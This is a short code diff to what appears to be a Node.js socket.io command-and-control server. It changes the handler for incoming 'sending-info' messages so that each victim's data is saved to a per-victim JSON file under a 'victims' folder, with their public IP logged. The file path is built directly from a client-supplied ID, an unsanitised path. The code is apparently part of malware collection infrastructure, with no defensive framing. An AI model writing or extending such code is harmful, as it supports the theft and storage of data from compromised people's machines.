@@ -140,6 +140,7 @@ io.on('connection', function(socket, next) {
     log.info(socket.handshake.address + " has connected.")
 
     socket.on('sending-info', function(data){
-      console.log(data)
+      var jsondata = JSON.stringify(data)
+      fs.writeFile("/home/ubuntu/victims/" + data.victimid + ".json", jsondata, console.log(data.victimid + "'s data got saved. Basic info: IP(" + data.publicip + ")")) 
     })
 })
